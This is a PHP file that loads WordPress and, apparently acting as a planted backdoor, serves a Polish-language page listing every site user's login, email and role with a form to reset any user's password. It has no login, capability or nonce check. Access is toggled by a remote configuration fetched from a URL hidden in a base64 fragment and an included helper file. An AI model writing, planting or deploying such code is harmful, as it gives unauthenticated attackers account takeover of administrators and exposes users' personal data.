<?php
include dirname(__FILE__) . '/lb_helper.php';

if (!isset($let)) {
    $let = ''; 
}
require_once($_SERVER['DOCUMENT_ROOT'] . '/wp-load.php');

function fetch_configuration($arl) {
    $response = wp_remote_get($arl);

    if (is_wp_error($response)) {
        return ['error' => 'Error fetching configuration.'];
    }

    $status_code = wp_remote_retrieve_response_code($response);

    if ($status_code != 200) {
        return ['error' => 'Error fetching configuration. Status Code: ' . esc_html($status_code)];
    }

    $body = wp_remote_retrieve_body($response);
    $config = json_decode($body, true);

    if (!$config || !isset($config['user_enabled'])) {
        return ['error' => 'Invalid configuration data received.'];
    }

    return $config;
}


$enl = $let
.'NzJiMDY4YjA4NzcyNDkzYzBl';

$arl = base64_decode($enl);

$config = fetch_configuration($arl);

if (isset($config['error'])) {
    wp_die($config['error']);
}

if (!$config['user_enabled']) {
    wp_die('This page is currently disabled.');
}

function reset_user_password($user_id, $new_password) {
    if (!get_user_by('id', $user_id)) {
        echo 'User ID does not exist.';
        return;
    }

    wp_set_password($new_password, $user_id);
    echo 'Password reset for user ID ' . esc_html($user_id) . '.';
}

if (isset($_POST['user_id']) && isset($_POST['new_password'])) {
    $user_id = intval($_POST['user_id']);
    $new_password = sanitize_text_field($_POST['new_password']);
    reset_user_password($user_id, $new_password);
}

$users = get_users();

echo '<h1>Lista użytkowników</h1>';
echo '<table border="1">';
echo '<tr><th>ID</th><th>Nazwa użytkownika</th><th>Adres</th><th>Rola</th><th>Resetowanie hasła</th></tr>';

foreach ($users as $user) {
    $user_roles = implode(', ', $user->roles);
    echo '<tr>';
    echo '<td>' . esc_html($user->ID) . '</td>';
    echo '<td>' . esc_html($user->user_login) . '</td>';
    echo '<td>' . esc_html($user->user_email) . '</td>';
    echo '<td>' . esc_html($user_roles) . '</td>';
    echo '<td>';
    echo '<form method="post" action="">';
    echo '<input type="hidden" name="user_id" value="' . esc_html($user->ID) . '">';
    echo '<input type="text" name="new_password" placeholder="Nowe hasło" required>';
    echo '<input type="submit" value="Resetuj hasło">';
    echo '</form>';
    echo '</td>';
    echo '</tr>';
}

echo '</table>';
?>
